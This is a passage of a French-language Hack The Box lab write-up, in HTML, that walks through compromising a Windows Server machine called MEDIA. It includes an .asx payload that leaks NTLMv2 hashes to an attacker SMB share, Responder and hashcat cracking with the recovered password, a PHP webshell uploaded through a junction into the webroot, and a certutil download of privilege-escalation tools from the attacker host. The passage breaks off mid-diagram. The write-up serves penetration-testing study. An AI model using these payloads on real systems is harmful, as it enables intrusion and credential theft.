@@ -1,0 +1,1218 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB CPTS — MEDIA Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@300;400;500;600;700;800;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-deep: #0a0c10;
+    --bg-card: #11141b;
+    --bg-card-hover: #161a24;
+    --bg-code: #0d1017;
+    --border: #1e2433;
+    --border-glow: #2a3548;
+    --text: #c9d1d9;
+    --text-dim: #6e7681;
+    --text-bright: #e6edf3;
+    --accent-green: #3fb950;
+    --accent-green-dim: #1a3a2a;
+    --accent-red: #f85149;
+    --accent-red-dim: #3a1a1a;
+    --accent-blue: #58a6ff;
+    --accent-blue-dim: #1a2a3a;
+    --accent-yellow: #d29922;
+    --accent-yellow-dim: #3a2a1a;
+    --accent-purple: #bc8cff;
+    --accent-purple-dim: #2a1a3a;
+    --accent-cyan: #39d353;
+    --accent-orange: #f0883e;
+    --gradient-green: linear-gradient(135deg, #3fb950 0%, #1f6feb 100%);
+    --gradient-red: linear-gradient(135deg, #f85149 0%, #da3633 100%);
+    --gradient-hero: linear-gradient(160deg, #0a0c10 0%, #111827 40%, #0f172a 100%);
+    --radius: 12px;
+    --radius-sm: 8px;
+    --radius-lg: 20px;
+    --shadow: 0 4px 24px rgba(0,0,0,0.4);
+    --shadow-glow: 0 0 40px rgba(63,185,80,0.08);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg-deep);
+    color: var(--text);
+    font-family: 'Outfit', sans-serif;
+    line-height: 1.7;
+    font-size: 16px;
+    overflow-x: hidden;
+  }
+
+  /* Noise texture overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* === HERO === */
+  .hero {
+    background: var(--gradient-hero);
+    border-bottom: 1px solid var(--border);
+    padding: 80px 0 60px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -200px;
+    right: -200px;
+    width: 600px;
+    height: 600px;
+    background: radial-gradient(circle, rgba(63,185,80,0.06) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .hero::after {
+    content: '';
+    position: absolute;
+    bottom: -100px;
+    left: -100px;
+    width: 400px;
+    height: 400px;
+    background: radial-gradient(circle, rgba(88,166,255,0.04) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .hero-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 40px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: var(--accent-green-dim);
+    border: 1px solid rgba(63,185,80,0.3);
+    color: var(--accent-green);
+    padding: 6px 16px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    font-family: 'JetBrains Mono', monospace;
+    margin-bottom: 24px;
+    animation: fadeInDown 0.6s ease;
+  }
+
+  .hero-badge::before {
+    content: '';
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--accent-green);
+    box-shadow: 0 0 8px var(--accent-green);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  .hero h1 {
+    font-size: clamp(48px, 6vw, 72px);
+    font-weight: 900;
+    color: var(--text-bright);
+    letter-spacing: -2px;
+    line-height: 1.05;
+    margin-bottom: 16px;
+    animation: fadeInDown 0.6s ease 0.1s both;
+  }
+
+  .hero h1 span {
+    background: var(--gradient-green);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-sub {
+    font-size: 18px;
+    color: var(--text-dim);
+    font-weight: 300;
+    max-width: 600px;
+    animation: fadeInDown 0.6s ease 0.2s both;
+  }
+
+  .hero-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 24px;
+    margin-top: 32px;
+    animation: fadeInDown 0.6s ease 0.3s both;
+  }
+
+  .meta-tag {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    color: var(--text-dim);
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    padding: 8px 16px;
+    border-radius: var(--radius-sm);
+  }
+
+  .meta-tag .label { color: var(--text-dim); }
+  .meta-tag .value { color: var(--text-bright); font-weight: 600; }
+
+  .meta-tag.os .value { color: var(--accent-blue); }
+  .meta-tag.diff .value { color: var(--accent-orange); }
+  .meta-tag.ip .value { color: var(--accent-green); }
+
+  @keyframes fadeInDown {
+    from { opacity: 0; transform: translateY(-16px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* === CONTAINER === */
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 60px 40px;
+  }
+
+  /* === PHASE SECTION === */
+  .phase {
+    margin-bottom: 64px;
+    animation: fadeIn 0.5s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 32px;
+    position: relative;
+  }
+
+  .phase-number {
+    width: 48px;
+    height: 48px;
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 700;
+    font-size: 18px;
+    flex-shrink: 0;
+  }
+
+  .phase-number.recon { background: var(--accent-blue-dim); color: var(--accent-blue); border: 1px solid rgba(88,166,255,0.3); }
+  .phase-number.exploit { background: var(--accent-red-dim); color: var(--accent-red); border: 1px solid rgba(248,81,73,0.3); }
+  .phase-number.access { background: var(--accent-green-dim); color: var(--accent-green); border: 1px solid rgba(63,185,80,0.3); }
+  .phase-number.analysis { background: var(--accent-yellow-dim); color: var(--accent-yellow); border: 1px solid rgba(210,153,34,0.3); }
+  .phase-number.privesc { background: var(--accent-purple-dim); color: var(--accent-purple); border: 1px solid rgba(188,140,255,0.3); }
+
+  .phase-title {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: -0.5px;
+  }
+
+  .phase-title small {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-dim);
+    letter-spacing: 0;
+    margin-top: 2px;
+  }
+
+  /* === CARDS === */
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 28px;
+    margin-bottom: 20px;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+  }
+
+  .card:hover {
+    border-color: var(--border-glow);
+    box-shadow: var(--shadow-glow);
+  }
+
+  .card h3 {
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .card h3 .icon {
+    font-size: 18px;
+    width: 28px;
+    text-align: center;
+  }
+
+  .card p, .card li {
+    color: var(--text);
+    font-size: 15px;
+    line-height: 1.8;
+  }
+
+  .card p + p { margin-top: 12px; }
+
+  /* === CODE BLOCKS === */
+  .code-block {
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 16px;
+    background: rgba(255,255,255,0.02);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-weight: 600;
+  }
+
+  .code-dots {
+    display: flex;
+    gap: 6px;
+  }
+
+  .code-dots span {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+  }
+
+  .code-dots span:nth-child(1) { background: #f85149; }
+  .code-dots span:nth-child(2) { background: #d29922; }
+  .code-dots span:nth-child(3) { background: #3fb950; }
+
+  .code-block pre {
+    padding: 16px 20px;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.65;
+    color: var(--text);
+  }
+
+  .code-block pre .comment { color: var(--text-dim); font-style: italic; }
+  .code-block pre .cmd { color: var(--accent-green); }
+  .code-block pre .flag { color: var(--accent-blue); }
+  .code-block pre .string { color: var(--accent-yellow); }
+  .code-block pre .result { color: var(--accent-purple); }
+
+  /* === TABLES === */
+  .table-wrap {
+    overflow-x: auto;
+    margin: 16px 0;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14px;
+  }
+
+  thead {
+    background: rgba(255,255,255,0.03);
+  }
+
+  th {
+    padding: 12px 18px;
+    text-align: left;
+    font-weight: 600;
+    color: var(--text-bright);
+    border-bottom: 1px solid var(--border);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+
+  td {
+    padding: 12px 18px;
+    border-bottom: 1px solid rgba(30,36,51,0.5);
+    color: var(--text);
+  }
+
+  tr:last-child td { border-bottom: none; }
+
+  tr:hover td { background: rgba(255,255,255,0.015); }
+
+  td code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12.5px;
+    background: var(--bg-code);
+    padding: 2px 8px;
+    border-radius: 4px;
+    color: var(--accent-blue);
+    border: 1px solid var(--border);
+  }
+
+  /* === CALLOUTS === */
+  .callout {
+    border-left: 3px solid;
+    padding: 16px 20px;
+    margin: 16px 0;
+    border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+    font-size: 14px;
+  }
+
+  .callout.info {
+    border-color: var(--accent-blue);
+    background: rgba(88,166,255,0.05);
+    color: var(--accent-blue);
+  }
+
+  .callout.warning {
+    border-color: var(--accent-yellow);
+    background: rgba(210,153,34,0.05);
+    color: var(--accent-yellow);
+  }
+
+  .callout.danger {
+    border-color: var(--accent-red);
+    background: rgba(248,81,73,0.05);
+    color: var(--accent-red);
+  }
+
+  .callout.success {
+    border-color: var(--accent-green);
+    background: rgba(63,185,80,0.05);
+    color: var(--accent-green);
+  }
+
+  .callout strong { color: inherit; }
+
+  /* === FLAG BOX === */
+  .flag-box {
+    background: linear-gradient(135deg, rgba(63,185,80,0.08) 0%, rgba(31,111,235,0.08) 100%);
+    border: 1px solid rgba(63,185,80,0.25);
+    border-radius: var(--radius);
+    padding: 20px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-icon {
+    font-size: 28px;
+    flex-shrink: 0;
+  }
+
+  .flag-content .flag-label {
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    color: var(--accent-green);
+    font-family: 'JetBrains Mono', monospace;
+    margin-bottom: 4px;
+  }
+
+  .flag-content .flag-hash {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 15px;
+    color: var(--text-bright);
+    font-weight: 500;
+    word-break: break-all;
+  }
+
+  /* === KILL CHAIN === */
+  .chain {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 32px 0;
+  }
+
+  .chain-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    position: relative;
+  }
+
+  .chain-line {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 40px;
+    flex-shrink: 0;
+  }
+
+  .chain-dot {
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    border: 2px solid var(--accent-green);
+    background: var(--bg-deep);
+    flex-shrink: 0;
+    z-index: 1;
+    position: relative;
+  }
+
+  .chain-dot.active {
+    background: var(--accent-green);
+    box-shadow: 0 0 12px rgba(63,185,80,0.4);
+  }
+
+  .chain-connector {
+    width: 2px;
+    height: 48px;
+    background: linear-gradient(to bottom, var(--accent-green), rgba(63,185,80,0.2));
+  }
+
+  .chain-content {
+    padding-bottom: 36px;
+    flex: 1;
+  }
+
+  .chain-content h4 {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-bottom: 4px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .chain-content p {
+    font-size: 13px;
+    color: var(--text-dim);
+    line-height: 1.5;
+  }
+
+  /* === FLOW DIAGRAM === */
+  .flow-diagram {
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 24px;
+    margin: 16px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 2;
+    color: var(--text);
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .flow-diagram .node {
+    color: var(--accent-cyan);
+  }
+
+  .flow-diagram .arrow {
+    color: var(--text-dim);
+  }
+
+  .flow-diagram .highlight {
+    color: var(--accent-yellow);
+  }
+
+  /* === TOOL GRID === */
+  .tool-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+    gap: 12px;
+    margin: 20px 0;
+  }
+
+  .tool-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 18px;
+    transition: border-color 0.3s, transform 0.2s;
+  }
+
+  .tool-card:hover {
+    border-color: var(--border-glow);
+    transform: translateY(-2px);
+  }
+
+  .tool-card .tool-name {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent-green);
+    margin-bottom: 6px;
+  }
+
+  .tool-card .tool-role {
+    font-size: 13px;
+    color: var(--text-dim);
+    line-height: 1.5;
+  }
+
+  /* === INLINE CODE === */
+  code:not(pre code) {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    background: var(--bg-code);
+    padding: 2px 8px;
+    border-radius: 4px;
+    color: var(--accent-blue);
+    border: 1px solid var(--border);
+  }
+
+  /* === SEPARATOR === */
+  .sep {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 48px 0;
+  }
+
+  /* === FOOTER === */
+  .footer {
+    text-align: center;
+    padding: 40px;
+    border-top: 1px solid var(--border);
+    color: var(--text-dim);
+    font-size: 13px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .footer .htb-green { color: var(--accent-green); }
+
+  /* === RESPONSIVE === */
+  @media (max-width: 768px) {
+    .hero { padding: 48px 0 40px; }
+    .hero-inner, .container { padding: 0 20px; }
+    .hero h1 { font-size: 36px; }
+    .hero-meta { gap: 12px; }
+    .phase-title { font-size: 22px; }
+    .tool-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ==================== HERO ==================== -->
+<section class="hero">
+  <div class="hero-inner">
+    <div class="hero-badge">
+      <span></span>
+      HTB CPTS — Writeup
+    </div>
+    <h1>MEDIA <span>Pwned.</span></h1>
+    <p class="hero-sub">Exploitation complète d'une machine Windows Server 2022 — de la capture NTLMv2 jusqu'à NT AUTHORITY\SYSTEM via junction attack et potato escalation.</p>
+    <div class="hero-meta">
+      <div class="meta-tag ip">
+        <span class="label">Target</span>
+        <span class="value">10.129.14.167</span>
+      </div>
+      <div class="meta-tag os">
+        <span class="label">OS</span>
+        <span class="value">Windows Server 2022</span>
+      </div>
+      <div class="meta-tag diff">
+        <span class="label">Stack</span>
+        <span class="value">XAMPP · Apache · PHP</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="container">
+
+<!-- ==================== PHASE 1 ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number recon">01</div>
+    <div class="phase-title">
+      Reconnaissance
+      <small>Identifier les services exposés et les vecteurs d'attaque</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🔍</span> Scan Nmap</h3>
+    <p>Nmap envoie des paquets TCP/UDP aux ports d'une machine et analyse les réponses pour déterminer quels ports sont ouverts, quel service tourne, quelle version, et quel OS.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">nmap</span> <span class="flag">-sC -sV</span> 10.129.14.167
+<span class="comment"># -sC : scripts de détection par défaut</span>
+<span class="comment"># -sV : détection des versions des services</span></pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">📊</span> Résultats du Scan</h3>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Port</th><th>Service</th><th>Version</th><th>Intérêt</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>22/tcp</code></td>
+            <td>SSH</td>
+            <td>OpenSSH for Windows 9.5</td>
+            <td>Accès shell si credentials trouvés</td>
+          </tr>
+          <tr>
+            <td><code>80/tcp</code></td>
+            <td>HTTP</td>
+            <td>Apache 2.4.56 / PHP 8.1.17</td>
+            <td>Application web à analyser</td>
+          </tr>
+          <tr>
+            <td><code>3389/tcp</code></td>
+            <td>RDP</td>
+            <td>Windows RDP</td>
+            <td>Accès bureau distant si credentials</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <strong>Hostname :</strong> MEDIA &nbsp;·&nbsp; <strong>Application :</strong> ProMotion Studio (site de recrutement) &nbsp;·&nbsp; <strong>Stack :</strong> Apache + PHP sur Windows = XAMPP
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== PHASE 2 ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number exploit">02</div>
+    <div class="phase-title">
+      Capture NTLMv2 via Responder
+      <small>Forcer le serveur à nous envoyer son hash d'authentification</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">📄</span> Le vecteur : fichier .asx</h3>
+    <p>ProMotion Studio expose un formulaire de recrutement qui permet d'uploader une vidéo. Un fichier <code>.asx</code> est une playlist Windows Media Player contenant une référence vers une ressource réseau distante.</p>
+    <p>Quand le serveur ouvre ce fichier, Windows tente automatiquement de se connecter via SMB et <strong>envoie le hash NTLMv2</strong> du compte qui exécute le processus.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">XML — payload.asx</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="string">&lt;ASX version="3.0"&gt;</span>
+  <span class="string">&lt;Entry&gt;</span>
+    <span class="string">&lt;Ref href="</span><span class="result">\\10.10.14.252\share\video.wmv</span><span class="string">"/&gt;</span>
+  <span class="string">&lt;/Entry&gt;</span>
+<span class="string">&lt;/ASX&gt;</span></pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">📡</span> Responder — Interception du hash</h3>
+    <p>Responder écoute sur les protocoles réseau (SMB, HTTP, LLMNR) et capture les authentifications entrantes en créant de faux serveurs.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">sudo responder</span> <span class="flag">-I</span> tun0
+<span class="comment"># -I tun0 : écoute sur l'interface VPN HTB</span>
+
+<span class="comment"># Hash capturé :</span>
+<span class="result">[SMB] NTLMv2 — MEDIA\enox</span>
+enox::MEDIA:7811c1e19d484f0c:BCB14EF02124623F...</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🔓</span> Hashcat — Cracking du hash</h3>
+    <p>Hashcat casse les mots de passe par dictionnaire en utilisant le GPU pour tester des millions de combinaisons par seconde.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">hashcat</span> <span class="flag">-m 5600</span> enox.hash /usr/share/wordlists/rockyou.txt
+<span class="comment"># -m 5600 : mode NTLMv2</span>
+<span class="comment"># rockyou.txt : 14 millions de mots de passe</span>
+
+<span class="result">enox : 1234virus@</span></pre>
+    </div>
+
+    <div class="callout warning">
+      <strong>Mot de passe faible.</strong> Présent dans rockyou.txt — un mot de passe long et aléatoire aurait résisté au cracking.
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== PHASE 3 ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number access">03</div>
+    <div class="phase-title">
+      Accès Initial via SSH
+      <small>Connexion avec les credentials crackés</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🖥️</span> Connexion SSH</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">ssh</span> enox@10.129.14.167
+<span class="comment"># Password: 1234virus@</span></pre>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div class="flag-content">
+        <div class="flag-label">User Flag</div>
+        <div class="flag-hash">18d1671997e03da873857d063149c879</div>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <strong>Analyse des privilèges :</strong> enox est un utilisateur standard — SeChangeNotifyPrivilege (basique) et SeIncreaseWorkingSetPrivilege (non exploitable). Aucun vecteur de privesc directe.
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== PHASE 4 ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number analysis">04</div>
+    <div class="phase-title">
+      Analyse du Code Source PHP
+      <small>Identifier les vulnérabilités dans l'application web</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🔬</span> Code Review — index.php</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">PHP — C:\xampp\htdocs\index.php</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="result">$uploadDir</span> = <span class="string">'C:/Windows/Tasks/Uploads/'</span>;
+<span class="result">$folderName</span> = <span class="cmd">md5</span>($firstname . $lastname . $email);
+<span class="result">$targetDir</span>  = $uploadDir . $folderName . <span class="string">'/'</span>;
+<span class="cmd">mkdir</span>($targetDir, 0777, true);
+<span class="cmd">move_uploaded_file</span>($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>], $targetFile);</pre>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>#</th><th>Problème</th><th>Impact</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code>1</code></td>
+            <td>Aucune validation d'extension</td>
+            <td>Upload de fichiers <code>.php</code> possible</td>
+          </tr>
+          <tr>
+            <td><code>2</code></td>
+            <td>Chemin prévisible <code>md5(firstname+lastname+email)</code></td>
+            <td>L'attaquant calcule le dossier à l'avance</td>
+          </tr>
+          <tr>
+            <td><code>3</code></td>
+            <td>Upload dans <code>C:\Windows\Tasks\</code></td>
+            <td>Zone sensible, accessible par enox</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== PHASE 5 ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number exploit">05</div>
+    <div class="phase-title">
+      Junction Attack + Webshell (RCE)
+      <small>Rediriger l'upload vers le webroot Apache</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🔗</span> Qu'est-ce qu'une Junction Windows ?</h3>
+    <p>Une junction est l'équivalent Windows d'un lien symbolique pour les dossiers. Tout ce qui est écrit dans le dossier source est redirigé transparentement vers le dossier cible.</p>
+
+    <div class="flow-diagram"><span class="node">C:\Windows\Tasks\Uploads\&lt;md5&gt;\</span> <span class="arrow">──junction──►</span> <span class="highlight">C:\xampp\htdocs\</span>
+        <span class="arrow">↑</span>                                             <span class="arrow">↑</span>
+   <span class="node">Où PHP écrit les fichiers</span>                <span class="highlight">Où Apache sert les fichiers</span></div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">⚡</span> Exploitation en 4 étapes</h3>
+
+    <p><strong>Étape 1 — Calculer le MD5 :</strong></p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash — Kali</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">echo</span> <span class="flag">-n</span> <span class="string">"johndoejohn@doe.com"</span> | <span class="cmd">md5sum</span>
+<span class="result">12c11b14d917e8d8fb03881e5929ff74</span></pre>
+    </div>
+
+    <p><strong>Étape 2 — Créer la junction :</strong></p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">CMD — SSH enox</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">mklink /J</span> <span class="string">"C:\Windows\Tasks\Uploads\12c11b14d917e8d8fb03881e5929ff74"</span> C:\xampp\htdocs
+<span class="result">Junction created &lt;&lt;===&gt;&gt; C:\xampp\htdocs</span></pre>
+    </div>
+
+    <p><strong>Étape 3 — Upload du webshell :</strong></p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash — Kali</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">echo</span> <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> > /tmp/shell.php
+
+<span class="cmd">curl</span> <span class="flag">-X POST</span> http://10.129.14.167/ \
+  <span class="flag">-F</span> <span class="string">"firstname=john"</span> \
+  <span class="flag">-F</span> <span class="string">"lastname=doe"</span> \
+  <span class="flag">-F</span> <span class="string">"email=john@doe.com"</span> \
+  <span class="flag">-F</span> <span class="string">'fileToUpload=@/tmp/shell.php;type=application/php'</span></pre>
+    </div>
+
+    <p><strong>Étape 4 — Exécution de commandes :</strong></p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="cmd">curl</span> <span class="string">"http://10.129.14.167/shell.php?cmd=whoami"</span>
+<span class="result">nt authority\local service</span></pre>
+    </div>
+
+    <div class="callout info">
+      <strong>Pourquoi LOCAL SERVICE ?</strong> Apache (XAMPP) tourne sous NT AUTHORITY\LOCAL SERVICE par défaut sur Windows. Tout code PHP exécuté hérite de ce compte.
+    </div>
+  </div>
+</section>
+
+<div class="sep"></div>
+
+<!-- ==================== PHASE 6 ==================== -->
+<section class="phase">
+  <div class="phase-header">
+    <div class="phase-number privesc">06</div>
+    <div class="phase-title">
+      Privilege Escalation
+      <small>LOCAL SERVICE → SYSTEM via FullPowers + GodPotato</small>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🔑</span> Disabled ≠ Absent — différence critique</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>État</th><th>Signification</th><th>Exploitable ?</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code style="color:var(--accent-green);">Enabled</code></td>
+            <td>Actif immédiatement</td>
+            <td style="color:var(--accent-green);">Oui</td>
+          </tr>
+          <tr>
+            <td><code style="color:var(--accent-yellow);">Disabled</code></td>
+            <td>Présent mais endormi, réactivable par code</td>
+            <td style="color:var(--accent-green);">Oui (avec le bon outil)</td>
+          </tr>
+          <tr>
+            <td><code style="color:var(--accent-red);">Absent</code></td>
+            <td>N'existe pas dans le token</td>
+            <td style="color:var(--accent-red);">Non</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout warning">
+      <strong>SeTcbPrivilege</strong> est Disabled mais présent. Il peut être réactivé via l'API Windows <code>AdjustTokenPrivileges()</code>.
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">⚙️</span> Étape A — FullPowers : Restaurer les privilèges</h3>
+    <p><strong>SeTcbPrivilege</strong> (Act as part of the operating system) permet de créer des tokens Windows avec des privilèges arbitraires. FullPowers le réactive puis crée un nouveau token avec tous les privilèges de LOCAL SERVICE restaurés.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><span class="comment"># Transfert de FullPowers vers la cible</span>
+<span class="cmd">certutil</span> <span class="flag">-urlcache -f</span> http://10.10.14.252:8080/FullPowers.exe C:\Windows\Temp\FullPowers.exe
+
+<span class="comment"># Exécution</span>
+C:\Windows\Temp\<span class="cmd">FullPowers.exe</span> <span class="flag">-c</span> <span class="string">"C:\Windows\Temp\rev2.exe"</span> <span class="flag">-z</span></pre>
+    </div>
+
+    <div class="callout success">
+      <strong>Privilèges restaurés :</strong><br>
+      SeImpersonatePrivilege — Enabled ✓<br>
+      SeAssignPrimaryTokenPrivilege — Enabled ✓
+    </div>
+  </div>
+
+  <div class="card">
+    <h3><span class="icon">🥔</span> Étape B — GodPotato : SeImpersonatePrivilege → SYSTEM</h3>
+    <p><strong>SeImpersonatePrivilege</strong> permet d'emprunter l'identité d'un autre utilisateur. GodPotato crée un faux serveur COM/RPC, force SYSTEM à s'y connecter, puis vole le token SYSTEM via <code>ImpersonateNamedPipeClient()</code>.</p>
+
+    <div class="flow-diagram"><span class="node">[LOCAL SERVICE]</span>
+    <span class="arrow">│</span>
+    <span class="arrow">│  1.</span> Crée un faux serveur COM/RPC
